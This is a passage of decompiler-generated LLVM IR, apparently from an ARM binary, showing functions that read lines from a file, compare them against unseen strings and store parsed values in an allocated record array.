  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 35, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 27, 24, 25, 26, 28, 29, 30, 31, 32, 33, 34, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 55, 22, 23, 24, 25, 26, 54, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 (i32)* @function_cda4, { 5, 4, 15, 14, 13, 12, 11, 10, 0, 17, 16, 9, 8, 7, 6, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_16200, { 1, 0 }
  uselistorder i32 -3, { 2, 0, 1, 3, 5, 4 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ()* @function_12ba4, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_fbd8, { 3, 4, 0, 2, 1 }
  uselistorder i32 64, { 2, 5, 0, 8, 6, 4, 12, 1, 3, 9, 10, 7, 11 }
  uselistorder i32 1000, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_fb6c, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_fc94, { 2, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 17, { 2, 4, 1, 6, 5, 3, 0 }
  uselistorder i32 76, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10, 11, 18, 19, 20, 21, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 27, { 2, 1, 0 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5, 6, 7 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5 }
  uselistorder i32 10756, { 1, 0, 2 }
  uselistorder i32 512, { 3, 5, 2, 6, 1, 7, 8, 9, 10, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16a94, { 1, 0 }
  uselistorder label %dec_label_pc_16a7c, { 1, 0 }
  uselistorder label %dec_label_pc_16a5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16a54, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_16a3c, { 1, 0 }
  uselistorder label %dec_label_pc_16a2c, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %dec_label_pc_16a04, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_169dc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_16934, { 1, 0, 2 }
  uselistorder label %dec_label_pc_168c0, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_167d4, { 1, 0 }
  uselistorder label %dec_label_pc_16780, { 1, 0 }
  uselistorder label %dec_label_pc_16750, { 1, 0 }
  uselistorder label %dec_label_pc_16728, { 1, 0 }
  uselistorder label %dec_label_pc_16674, { 1, 0, 2 }
  uselistorder label %bb218, { 1, 0 }
  uselistorder label %dec_label_pc_164d0, { 1, 0 }
  uselistorder label %dec_label_pc_16494, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
}

define i32 @function_16aa4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16aa4:
  %v0_16aa4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16aa4, label %bb, label %.thread13

bb:                                               ; preds = %dec_label_pc_16aa4
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_16aa4, %bb
  %v7_16adc = phi i32 [ %arg1, %dec_label_pc_16aa4 ], [ 0, %bb ]
  ret i32 %v7_16adc

; uselistorder directives
  uselistorder label %.thread13, { 1, 0 }
}

define i32 @function_16ae0() local_unnamed_addr {
dec_label_pc_16ae0:
  store i32 920, i32* @lr, align 4
  store i32 142044, i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @function_16b34(i32 %arg1) local_unnamed_addr {
dec_label_pc_16b34:
  store i32 142044, i32* @ip, align 4
  store i32 920, i32* @r4, align 4
  store i32 0, i32* @lr, align 4
  call void @llvm.trap()
  unreachable

; uselistorder directives
  uselistorder i32 920, { 2, 3, 4, 5, 1, 0, 6 }
}

define i32 @function_16b8c() local_unnamed_addr {
dec_label_pc_16b8c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp47 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i8*, align 4
  %v3_16b8c = load i32, i32* @r4, align 4
  %v15_16b8c = load i32, i32* @r8, align 4
  %v18_16b8c = load i32, i32* @sb, align 4
  %v21_16b8c = load i32, i32* @sl, align 4
  %v24_16b8c = load i32, i32* @fp, align 4
  store i32 12308, i32* %r3.global-to-local, align 4
  store i32 142044, i32* @r5, align 4
  %v4_16b9c = load i32, i32* @global_var_25af0.671, align 4
  store i32 %v4_16b9c, i32* @r4, align 4
  %v2_16ba0 = icmp eq i32 %v4_16b9c, 0
  br i1 %v2_16ba0, label %dec_label_pc_16bac, label %dec_label_pc_16bdc

dec_label_pc_16bac:                               ; preds = %dec_label_pc_16b8c
  %v2_16bb0 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_16bb0, i32* %r1.global-to-local, align 4
  %v3_16bb8 = call i32 @function_174dc(i32 ptrtoint ([17 x i8]* @global_var_1aa38.673 to i32), i32 %v2_16bb0)
  %v2_16bbc = icmp eq i32 %v3_16bb8, 0
  %v1_16bc0 = load i32, i32* @r4, align 4
  %.v1_16bc0 = select i1 %v2_16bbc, i32 %tmp47, i32 %v1_16bc0
  store i32 10784, i32* %r1.global-to-local, align 4
  store i32 %.v1_16bc0, i32* %r2.global-to-local, align 4
  %v0_16bcc = load i32, i32* @r5, align 4
  %v2_16bcc = add i32 %v0_16bcc, 10784
  %v3_16bcc = inttoptr i32 %v2_16bcc to i32*
  %v4_16bcc = load i32, i32* %v3_16bcc, align 4
  store i32 %v4_16bcc, i32* %r3.global-to-local, align 4
  %v9_16bd0 = icmp eq i32 %v4_16bcc, %.v1_16bc0
  br i1 %v9_16bd0, label %.thread, label %dec_label_pc_16fe8

.thread:                                          ; preds = %dec_label_pc_16bac
  store i32 93148, i32* @lr, align 4
  br label %dec_label_pc_16bdc

dec_label_pc_16bdc:                               ; preds = %.thread, %dec_label_pc_16b8c
  %v2_16bf4 = phi i32 [ %v0_16bcc, %.thread ], [ 142044, %dec_label_pc_16b8c ]
  store i32 12320, i32* %r3.global-to-local, align 4
  %v2_16be0 = add i32 %v2_16bf4, 12320
  %v3_16be0 = inttoptr i32 %v2_16be0 to i32*
  %v4_16be0 = load i32, i32* %v3_16be0, align 4
  store i32 %v4_16be0, i32* %r3.global-to-local, align 4
  %v2_16be4 = icmp eq i32 %v4_16be0, 0
  br i1 %v2_16be4, label %dec_label_pc_16bec, label %dec_label_pc_16f80

dec_label_pc_16bec:                               ; preds = %dec_label_pc_16bdc
  %v4_16bf4 = add i32 %v2_16bf4, 934
  %v5_16bf4 = inttoptr i32 %v4_16bf4 to i8*
  store i8 5, i8* %v5_16bf4, align 1
  store i32 935, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_16c08 = load i32, i32* @r5, align 4
  %v4_16c08 = add i32 %v2_16c08, 935
  %v5_16c08 = inttoptr i32 %v4_16c08 to i8*
  store i8 3, i8* %v5_16c08, align 1
  store i32 ptrtoint ([17 x i8]* @global_var_1aa38.673 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1a378.580 to i32), i32* @r1, align 4
  %v3_16c14 = call i32 @function_cfd8(i32 ptrtoint ([17 x i8]* @global_var_1aa38.673 to i32), i32 ptrtoint (i32* @global_var_1a378.580 to i32))
  store i32 %v3_16c14, i32* @fp, align 4
  %v2_16c18 = icmp eq i32 %v3_16c14, 0
  br i1 %v2_16c18, label %dec_label_pc_16ea4, label %dec_label_pc_16e4c

dec_label_pc_16c24:                               ; preds = %dec_label_pc_16e4c, %dec_label_pc_16e80.backedge
  %v1_16c28 = call i32 @function_16b34(i32 %v2_16e80)
  store i32 %v1_16c28, i32* %r4.global-to-local, align 4
  %v0_16c30 = call i32 @function_16ae0()
  %v1_16c34 = call i32 @function_16b34(i32 %v0_16c30)
  store i32 ptrtoint ([11 x i8]* @global_var_1aa4c.686 to i32), i32* @r1, align 4
  store i32 %v1_16c34, i32* @r7, align 4
  %v0_16c40 = load i32, i32* @r4, align 4
  %v3_16c44 = inttoptr i32 %v0_16c40 to i8*
  %v4_16c44 = call i32 @function_14410(i8* %v3_16c44, i32 ptrtoint ([11 x i8]* @global_var_1aa4c.686 to i32))
  %sext = mul i32 %v4_16c44, 16777216
  %v1_16c48 = sdiv i32 %sext, 16777216
  store i32 %v1_16c48, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_16c50, label %dec_label_pc_16d0c

dec_label_pc_16c50:                               ; preds = %dec_label_pc_16c24
  %v0_16c54 = call i32 @function_16ae0()
  %v1_16c54 = inttoptr i32 %v0_16c54 to i8*
  store i32 %v2_16c58, i32* @r4, align 4
  %v0_16c5c = load i32, i32* @r6, align 4
  %v1_16c5c = trunc i32 %v0_16c5c to i8
  store i8 %v1_16c5c, i8* %v1_16c54, align 1
  %v0_16c60 = load i32, i32* @r6, align 4
  store i32 %v0_16c60, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  %v3_16c6c = call i32 @function_f240(i8* %v2_16c6c, i32 %v0_16c60)
  %v0_16c74 = load i32, i32* @r7, align 4
  store i32 %v0_16c74, i32* %r1.global-to-local, align 4
  store i32 %v2_16c78, i32* %r2.global-to-local, align 4
  %v3_16c7c = inttoptr i32 %v0_16c74 to i8*
  %v4_16c7c = call i32 @function_15c1c(i32 10, i8* %v3_16c7c, i32 %v2_16c78)
  %tmp69 = icmp slt i32 %v4_16c7c, 1
  br i1 %tmp69, label %dec_label_pc_16c8c, label %dec_label_pc_16ca8

dec_label_pc_16c8c:                               ; preds = %dec_label_pc_16c50
  %v0_16c8c = load i32, i32* @r7, align 4
  store i32 %v0_16c8c, i32* %r1.global-to-local, align 4
  store i32 %v2_16c90, i32* %r2.global-to-local, align 4
  %v3_16c98 = inttoptr i32 %v0_16c8c to i8*
  %v4_16c98 = call i32 @function_15c1c(i32 2, i8* %v3_16c98, i32 %v2_16c90)
  %tmp70 = icmp slt i32 %v4_16c98, 1
  br i1 %tmp70, label %dec_label_pc_16e80.backedge, label %dec_label_pc_16ca8

dec_label_pc_16ca8:                               ; preds = %dec_label_pc_16c8c, %dec_label_pc_16c50
  %v0_16cac.off0 = phi i16 [ 10, %dec_label_pc_16c50 ], [ 2, %dec_label_pc_16c8c ]
  store i32 %v2_16ca8, i32* %r2.global-to-local, align 4
  store i16 %v0_16cac.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 12320, i32* @r7, align 4
  %v0_16cbc = load i32, i32* @r5, align 4
  %v2_16cbc = add i32 %v0_16cbc, 12320
  %v3_16cbc = inttoptr i32 %v2_16cbc to i32*
  %v4_16cbc = load i32, i32* %v3_16cbc, align 4
  store i32 12316, i32* @sl, align 4
  %v1_16cc4 = add i32 %v4_16cbc, 1
  store i32 %v1_16cc4, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_16ccc = mul i32 %v1_16cc4, 28
  store i32 %v2_16ccc, i32* %r1.global-to-local, align 4
  %v4_16cd0 = load i32, i32* @global_var_25af8.661, align 4
  %v2_16cd4 = inttoptr i32 %v4_16cd0 to i32*
  %v3_16cd4 = call i32 @function_14f14(i32* %v2_16cd4, i32 %v2_16ccc)
  store i32 %v3_16cd4, i32* @r6, align 4
  %v2_16cd8 = icmp eq i32 %v3_16cd4, 0
  br i1 %v2_16cd8, label %dec_label_pc_16e80.backedge, label %dec_label_pc_16ce0

dec_label_pc_16ce0:                               ; preds = %dec_label_pc_16ca8
  %v0_16ce0 = load i32, i32* @r5, align 4
  %v1_16ce0 = load i32, i32* @r7, align 4
  %v2_16ce0 = add i32 %v1_16ce0, %v0_16ce0
  %v3_16ce0 = inttoptr i32 %v2_16ce0 to i32*
  %v4_16ce0 = load i32, i32* %v3_16ce0, align 4
  store i32 %v4_16ce0, i32* %r4.global-to-local, align 4
  %v1_16ce4 = load i32, i32* @r8, align 4
  %v3_16ce4 = mul i32 %v1_16ce4, %v4_16ce0
  %v4_16ce4 = add i32 %v3_16ce4, %v3_16cd4
  %v2_16cec = load i16, i16* %stack_var_-68, align 2
  %v3_16cec = sext i16 %v2_16cec to i32
  %v6_16cec = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_16cec, i32* %r1.global-to-local, align 4
  %v9_16cec = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_16cec, i32* %r2.global-to-local, align 4
  store i32 %v14_16cec, i32* @ip, align 4
  store i32 %v3_16cd4, i32* @global_var_25af8.661, align 4
  %v1_16cf4 = inttoptr i32 %v4_16ce4 to i32*
  store i32 %v3_16cec, i32* %v1_16cf4, align 4
  %v3_16cf4 = add i32 %v4_16ce4, 4
  %v4_16cf4 = inttoptr i32 %v3_16cf4 to i32*
  %v5_16cf4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16cf4, i32* %v4_16cf4, align 4
  %v6_16cf4 = add i32 %v4_16ce4, 8
  %v7_16cf4 = inttoptr i32 %v6_16cf4 to i32*
  %v8_16cf4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16cf4, i32* %v7_16cf4, align 4
  %v9_16cf4 = add i32 %v4_16ce4, 12
  %v10_16cf4 = inttoptr i32 %v9_16cf4 to i32*
  %v11_16cf4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_16cf4, i32* %v10_16cf4, align 4
  %v12_16cf4 = add i32 %v4_16ce4, 16
  store i32 %v12_16cf4, i32* @lr, align 4
  %v2_16cf8 = load i32, i32* %stack_var_-52, align 4
  %v0_16cfc = load i32, i32* %r4.global-to-local, align 4
  %v1_16cfc = add i32 %v0_16cfc, 1
  store i32 %v1_16cfc, i32* %r4.global-to-local, align 4
  %v1_16d00 = inttoptr i32 %v12_16cf4 to i32*
  store i32 %v2_16cf8, i32* %v1_16d00, align 4
  %v3_16d00 = add i32 %v4_16ce4, 20
  %v4_16d00 = inttoptr i32 %v3_16d00 to i32*
  %v5_16d00 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16d00, i32* %v4_16d00, align 4
  %v6_16d00 = add i32 %v4_16ce4, 24
  %v7_16d00 = inttoptr i32 %v6_16d00 to i32*
  %v8_16d00 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16d00, i32* %v7_16d00, align 4
  %v0_16d04 = load i32, i32* %r4.global-to-local, align 4
  %v1_16d04 = load i32, i32* @r5, align 4
  %v2_16d04 = load i32, i32* @r7, align 4
  %v3_16d04 = add i32 %v2_16d04, %v1_16d04
  %v4_16d04 = inttoptr i32 %v3_16d04 to i32*
  store i32 %v0_16d04, i32* %v4_16d04, align 4
  br label %dec_label_pc_16e80.backedge

dec_label_pc_16e80.backedge:                      ; preds = %dec_label_pc_16da8, %dec_label_pc_16d98, %dec_label_pc_16d64, %dec_label_pc_16ce0, %dec_label_pc_16e38, %dec_label_pc_16c8c, %dec_label_pc_16ca8, %dec_label_pc_16de0, %dec_label_pc_16de8, %dec_label_pc_16dcc, %dec_label_pc_16e1c
  %v0_16e8c.pre = load i32, i32* @fp, align 4
  store i32 %v2_16e80, i32* @r4, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_16e8c.pre, i32* %r2.global-to-local, align 4
  %v3_16e90 = call i32 @function_ea64(i32 %v2_16e80, i32 128, i32 %v0_16e8c.pre)
  %v2_16e94 = icmp eq i32 %v3_16e90, 0
  br i1 %v2_16e94, label %dec_label_pc_16e9c, label %dec_label_pc_16c24

dec_label_pc_16d0c:                               ; preds = %dec_label_pc_16c24
  %v0_16d0c = load i32, i32* @r4, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1aa58.688 to i32), i32* @r1, align 4
  %v3_16d14 = inttoptr i32 %v0_16d0c to i8*
  %v4_16d14 = call i32 @function_14410(i8* %v3_16d14, i32 ptrtoint ([7 x i8]* @global_var_1aa58.688 to i32))
  %v2_16d18 = icmp eq i32 %v4_16d14, 0
  br i1 %v2_16d18, label %dec_label_pc_16d4c, label %dec_label_pc_16d20

dec_label_pc_16d20:                               ; preds = %dec_label_pc_16d0c
  %v0_16d20 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1aa60.690 to i32), i32* @r1, align 4
  %v3_16d28 = inttoptr i32 %v0_16d20 to i8*
  %v4_16d28 = call i32 @function_14410(i8* %v3_16d28, i32 ptrtoint ([7 x i8]* @global_var_1aa60.690 to i32))
  %v2_16d2c = icmp eq i32 %v4_16d28, 0
  br i1 %v2_16d2c, label %dec_label_pc_16d4c, label %dec_label_pc_16dcc

dec_label_pc_16d38:                               ; preds = %dec_label_pc_16d4c, %dec_label_pc_16d38.dec_label_pc_16d38_crit_edge
  %v2_16d3c = phi i32 [ %v1_16d50, %dec_label_pc_16d38.dec_label_pc_16d38_crit_edge ], [ %v1_16d5016, %dec_label_pc_16d4c ]
  %v0_16d3c = phi i32 [ %v1_16d58, %dec_label_pc_16d38.dec_label_pc_16d38_crit_edge ], [ %v1_16d5823, %dec_label_pc_16d4c ]
  %v1_16d38 = phi i32 [ %v1_16d38.pre, %dec_label_pc_16d38.dec_label_pc_16d38_crit_edge ], [ 12312, %dec_label_pc_16d4c ]
  %v1_16d3c = phi i32 [ %v0_16d50, %dec_label_pc_16d38.dec_label_pc_16d38_crit_edge ], [ %v0_16d5015, %dec_label_pc_16d4c ]
  %v2_16d38 = add i32 %v1_16d3c, %v1_16d38
  %v3_16d38 = inttoptr i32 %v2_16d38 to i32*
  %v4_16d38 = load i32, i32* %v3_16d38, align 4
  store i32 %v4_16d38, i32* %r3.global-to-local, align 4
  %v3_16d3c = add i32 %v1_16d3c, %v2_16d3c
  %v4_16d3c = inttoptr i32 %v3_16d3c to i32*
  store i32 %v0_16d3c, i32* %v4_16d3c, align 4
  %v0_16d40 = load i32, i32* %r3.global-to-local, align 4
  %v1_16d40 = load i32, i32* %r2.global-to-local, align 4
  %v4_16d40 = mul i32 %v1_16d40, 4
  %v5_16d40 = add i32 %v4_16d40, %v0_16d40
  %v6_16d40 = inttoptr i32 %v5_16d40 to i32*
  %v7_16d40 = load i32, i32* %v6_16d40, align 4
  store i32 %v7_16d40, i32* @r0, align 4
  %v0_16d44 = call i32 @function_108e4()
  %v0_16d50 = load i32, i32* @r5, align 4
  %v1_16d50 = load i32, i32* @sb, align 4
  %v2_16d50 = add i32 %v1_16d50, %v0_16d50
  %v3_16d50 = inttoptr i32 %v2_16d50 to i32*
  %v4_16d50 = load i32, i32* %v3_16d50, align 4
  store i32 %v4_16d50, i32* %r3.global-to-local, align 4
  %v2_16d54 = icmp eq i32 %v4_16d50, 0
  %v1_16d58 = add i32 %v4_16d50, -1
  store i32 %v1_16d58, i32* %r2.global-to-local, align 4
  br i1 %v2_16d54, label %dec_label_pc_16d60, label %dec_label_pc_16d38.dec_label_pc_16d38_crit_edge

dec_label_pc_16d38.dec_label_pc_16d38_crit_edge:  ; preds = %dec_label_pc_16d38
  %v1_16d38.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16d38

dec_label_pc_16d4c:                               ; preds = %dec_label_pc_16d20, %dec_label_pc_16d0c
  store i32 12312, i32* @r4, align 4
  %v0_16d5015 = load i32, i32* @r5, align 4
  %v1_16d5016 = load i32, i32* @sb, align 4
  %v2_16d5017 = add i32 %v1_16d5016, %v0_16d5015
  %v3_16d5018 = inttoptr i32 %v2_16d5017 to i32*
  %v4_16d5019 = load i32, i32* %v3_16d5018, align 4
  store i32 %v4_16d5019, i32* %r3.global-to-local, align 4
  %v2_16d5421 = icmp eq i32 %v4_16d5019, 0
  %v1_16d5823 = add i32 %v4_16d5019, -1
  store i32 %v1_16d5823, i32* %r2.global-to-local, align 4
  br i1 %v2_16d5421, label %dec_label_pc_16d60, label %dec_label_pc_16d38

dec_label_pc_16d60:                               ; preds = %dec_label_pc_16d38, %dec_label_pc_16d4c
  store i32 12312, i32* @r6, align 4
  br label %dec_label_pc_16d64

dec_label_pc_16d64:                               ; preds = %dec_label_pc_16da8, %dec_label_pc_16d60
  %v0_16d68 = call i32 @function_16ae0()
  %v1_16d6c = call i32 @function_16b34(i32 %v0_16d68)
  %v0_16d70 = load i32, i32* @r5, align 4
  %v1_16d70 = load i32, i32* @sb, align 4
  %v2_16d70 = add i32 %v1_16d70, %v0_16d70
  %v3_16d70 = inttoptr i32 %v2_16d70 to i32*
  %v4_16d70 = load i32, i32* %v3_16d70, align 4
  store i32 %v1_16d6c, i32* @r4, align 4
  %tmp77 = mul i32 %v4_16d70, 4
  %v3_16d7c = add i32 %tmp77, 4
  store i32 %v3_16d7c, i32* %r1.global-to-local, align 4
  %v4_16d80 = load i32, i32* @global_var_25af4.657, align 4
  %v2_16d84 = inttoptr i32 %v4_16d80 to i32*
  %v3_16d84 = call i32 @function_14f14(i32* %v2_16d84, i32 %v3_16d7c)
  store i32 %v3_16d84, i32* %r3.global-to-local, align 4
  %v2_16d88 = icmp eq i32 %v3_16d84, 0
  %v0_16d8c = load i32, i32* @r7, align 4
  %v0_16d90 = load i32, i32* @r4, align 4
  store i32 %v0_16d90, i32* @r7, align 4
  br i1 %v2_16d88, label %dec_label_pc_16e80.backedge, label %dec_label_pc_16d98

dec_label_pc_16d98:                               ; preds = %dec_label_pc_16d64
  store i32 %v3_16d84, i32* @global_var_25af4.657, align 4
  %v1_16d9c = call i32 @function_f7d0(i32 %v0_16d8c)
  %v2_16da0 = icmp eq i32 %v1_16d9c, 0
  br i1 %v2_16da0, label %dec_label_pc_16e80.backedge, label %dec_label_pc_16da8

dec_label_pc_16da8:                               ; preds = %dec_label_pc_16d98
  %v0_16da8 = load i32, i32* @r5, align 4
  %v1_16da8 = load i32, i32* @sb, align 4
  %v2_16da8 = add i32 %v1_16da8, %v0_16da8
  %v3_16da8 = inttoptr i32 %v2_16da8 to i32*
  %v4_16da8 = load i32, i32* %v3_16da8, align 4
  store i32 %v4_16da8, i32* %r3.global-to-local, align 4
  %v4_16dac = load i32, i32* @global_var_25af4.657, align 4
  store i32 %v4_16dac, i32* %r2.global-to-local, align 4
  %v1_16db0 = add i32 %v4_16da8, 1
  store i32 %v1_16db0, i32* %r1.global-to-local, align 4
  %v5_16db4 = mul i32 %v4_16da8, 4
  %v6_16db4 = add i32 %v4_16dac, %v5_16db4
  %v7_16db4 = inttoptr i32 %v6_16db4 to i32*
  store i32 %v1_16d9c, i32* %v7_16db4, align 4
  %v0_16db8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16db8 = load i32, i32* @r5, align 4
  %v2_16db8 = load i32, i32* @sb, align 4
  %v3_16db8 = add i32 %v2_16db8, %v1_16db8
  %v4_16db8 = inttoptr i32 %v3_16db8 to i32*
  store i32 %v0_16db8, i32* %v4_16db8, align 4
  %v0_16dbc = load i32, i32* @r4, align 4
  %v1_16dbc = inttoptr i32 %v0_16dbc to i8*
  %v2_16dbc = load i8, i8* %v1_16dbc, align 1
  %v3_16dbc = zext i8 %v2_16dbc to i32
  store i32 %v3_16dbc, i32* %r3.global-to-local, align 4
  %v2_16dc0 = icmp eq i8 %v2_16dbc, 0
  br i1 %v2_16dc0, label %dec_label_pc_16e80.backedge, label %dec_label_pc_16d64

dec_label_pc_16dcc:                               ; preds = %dec_label_pc_16d20
  %v0_16dcc = load i32, i32* @r4, align 4
  %v2_16dd0 = load i8*, i8** %stack_var_-560, align 4
  %v3_16dd0 = ptrtoint i8* %v2_16dd0 to i32
  store i32 %v3_16dd0, i32* @r1, align 4
  %v3_16dd4 = inttoptr i32 %v0_16dcc to i8*
  %v4_16dd4 = call i32 @function_14410(i8* %v3_16dd4, i32 %v3_16dd0)
  %sext6 = mul i32 %v4_16dd4, 16777216
  %v1_16dd8 = sdiv i32 %sext6, 16777216
  store i32 %v1_16dd8, i32* @r4, align 4
  %sext6.off = or i32 %sext6, 16777215
  %tmp78 = icmp ult i32 %sext6.off, 33554431
  br i1 %tmp78, label %dec_label_pc_16de0, label %dec_label_pc_16e80.backedge

dec_label_pc_16de0:                               ; preds = %dec_label_pc_16dcc
  %v0_16de0 = load i32, i32* @r7, align 4
  %v2_16de0 = icmp eq i32 %v0_16de0, 0
  br i1 %v2_16de0, label %dec_label_pc_16e80.backedge, label %dec_label_pc_16de8

dec_label_pc_16de8:                               ; preds = %dec_label_pc_16de0
  store i32 %v0_16de0, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_16df0 = call i32 @function_14918(i32 %v0_16de0, i32 58)
  store i32 %v2_16df0, i32* @r6, align 4
  %v3_16df4 = icmp eq i32 %v2_16df0, 0
  br i1 %v3_16df4, label %dec_label_pc_16e80.backedge, label %dec_label_pc_16dfc

dec_label_pc_16dfc:                               ; preds = %dec_label_pc_16de8
  %v0_16e00 = load i32, i32* @r4, align 4
  %v1_16e00 = trunc i32 %v0_16e00 to i8
  %v3_16e00 = inttoptr i32 %v2_16df0 to i8*
  store i8 %v1_16e00, i8* %v3_16e00, align 1
  store i32 ptrtoint ([8 x i8]* @global_var_1aa70.682 to i32), i32* @r1, align 4
  %v0_16e08 = load i32, i32* @r7, align 4
  %v3_16e0c = inttoptr i32 %v0_16e08 to i8*
  %v4_16e0c = call i32 @function_14410(i8* %v3_16e0c, i32 ptrtoint ([8 x i8]* @global_var_1aa70.682 to i32))
  %v2_16e10 = icmp eq i32 %v4_16e0c, 0
  br i1 %v2_16e10, label %dec_label_pc_16e38, label %dec_label_pc_16e1c

dec_label_pc_16e1c:                               ; preds = %dec_label_pc_16dfc
  %v0_16e20 = load i32, i32* @r7, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1aa78.684 to i32), i32* @r1, align 4
  %v3_16e28 = inttoptr i32 %v0_16e20 to i8*
  %v4_16e28 = call i32 @function_14410(i8* %v3_16e28, i32 ptrtoint ([9 x i8]* @global_var_1aa78.684 to i32))
  %v2_16e2c = icmp eq i32 %v4_16e28, 0
  br i1 %v2_16e2c, label %dec_label_pc_16e38, label %dec_label_pc_16e80.backedge

dec_label_pc_16e38:                               ; preds = %dec_label_pc_16e1c, %dec_label_pc_16dfc
  %storemerge = phi i32 [ 934, %dec_label_pc_16dfc ], [ 935, %dec_label_pc_16e1c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_16e38 = load i32, i32* @r6, align 4
  %v1_16e38 = add i32 %v0_16e38, 1
  store i32 %v1_16e38, i32* @r0, align 4
  %v0_16e3c = load i32, i32* @r5, align 4
  %v2_16e3c = add i32 %v0_16e3c, %storemerge
  store i32 %v2_16e3c, i32* @r4, align 4
  %v1_16e40 = call i32 @function_11290(i32 %v1_16e38)
  %v2_16e40 = trunc i32 %v1_16e40 to i8
  %v3_16e44 = load i32, i32* @r4, align 4
  %v4_16e44 = inttoptr i32 %v3_16e44 to i8*
  store i8 %v2_16e40, i8* %v4_16e44, align 1
  br label %dec_label_pc_16e80.backedge

dec_label_pc_16e4c:                               ; preds = %dec_label_pc_16bec
  store i32 ptrtoint ([8 x i8]* @global_var_1aa68.692 to i32), i32* %r3.global-to-local, align 4
  store i32 12324, i32* @sb, align 4
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1aa68.692, i32 0, i32 0), i8** %stack_var_-560, align 4
  %v2_16e80 = ptrtoint i32* %stack_var_-288 to i32
  %v2_16c58 = ptrtoint i16* %stack_var_-68 to i32
  %v2_16c6c = bitcast i16* %stack_var_-68 to i8*
  %v2_16c78 = ptrtoint i32* %stack_var_-60 to i32
  %v2_16c90 = ptrtoint i32* %stack_var_-64 to i32
  %v2_16ca8 = ptrtoint i32* %stack_var_-304 to i32
  %v14_16cec = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_16e80, i32* @r4, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v3_16c14, i32* %r2.global-to-local, align 4
  %v3_16e9074 = call i32 @function_ea64(i32 %v2_16e80, i32 128, i32 %v3_16c14)
  %v2_16e9476 = icmp eq i32 %v3_16e9074, 0
  br i1 %v2_16e9476, label %dec_label_pc_16e9c, label %dec_label_pc_16c24

dec_label_pc_16e9c:                               ; preds = %dec_label_pc_16e80.backedge, %dec_label_pc_16e4c
  %v0_16e9c = load i32, i32* @fp, align 4
  %v1_16ea0 = inttoptr i32 %v0_16e9c to i16*
  %v2_16ea0 = call i32 @function_ce24(i16* %v1_16ea0)
  br label %dec_label_pc_16ea4

dec_label_pc_16ea4:                               ; preds = %dec_label_pc_16bec, %dec_label_pc_16e9c
  store i32 12320, i32* %r3.global-to-local, align 4
  %v0_16ea8 = load i32, i32* @r5, align 4
  %v2_16ea8 = add i32 %v0_16ea8, 12320
